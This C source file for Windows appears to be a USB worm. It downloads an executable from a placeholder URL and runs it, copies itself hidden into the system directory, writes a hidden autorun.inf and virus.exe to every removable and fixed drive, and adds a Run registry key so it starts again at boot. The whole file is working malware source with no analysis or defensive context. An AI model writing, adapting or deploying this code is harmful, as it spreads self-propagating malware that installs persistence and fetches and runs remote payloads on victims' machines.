#include <afxwin.h>
#include <Urlmon.h>

#pragma comment(lib, "Urlmon.lib")

#define MAX_SIZE 100

char CurrentFile[MAX_SIZE];
char SystemPath[MAX_SIZE];

void DownloadToRun()
{
	URLDownloadToFile(NULL, "URL", "C:\\1.exe", NULL, NULL);
	WinExec("C:\\1.exe", 0);
}

BOOL FileCreate()
{
	FILE *fp;
	fp = fopen("autorun.inf", "w");
	fprintf(fp, "%s\n%s", "[AutoRun]", "shell\\open\\command=virus.exe");
	fclose(fp);
	return TRUE;
}

void CopyToDriver()
{
	FileCreate();
	for (char i = 'A'; i<='Z';i++)
	{
		char driver_1[15] = {i,':'};
		char driver_2[15] = {i,':'};
		if ((GetDriveType(driver_1) == DRIVE_REMOVABLE)||(GetDriveType(driver_1)==DRIVE_FIXED))
		{
			strcat(driver_1, "\\autorun.inf");
			strcat(driver_2, "\\virus.exe");
			CopyFile("autorun.inf", driver_1, FALSE);
			CopyFile(CurrentFile,driver_2, FALSE);
			SetFileAttributes(driver_1, 
				FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
			SetFileAttributes(driver_2, 
				FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
		}
	}
}

int MsgHook()
{

	DownloadToRun();
	
	GetModuleFileName(NULL, CurrentFile, MAX_SIZE);
	GetSystemDirectory(SystemPath, MAX_SIZE);
	strcat(SystemPath, "\\usbvirus.exe");
	CopyFile(CurrentFile, SystemPath, FALSE);

	SetFileAttributes(SystemPath, FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
	
	CopyToDriver();

	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
		0, KEY_ALL_ACCESS, &hKey))
	{
		RegSetValueEx(hKey, "usbvirus", 0, REG_SZ, (BYTE*)SystemPath, lstrlen(SystemPath));
		RegCloseKey(hKey);
	}
	return 0;
}

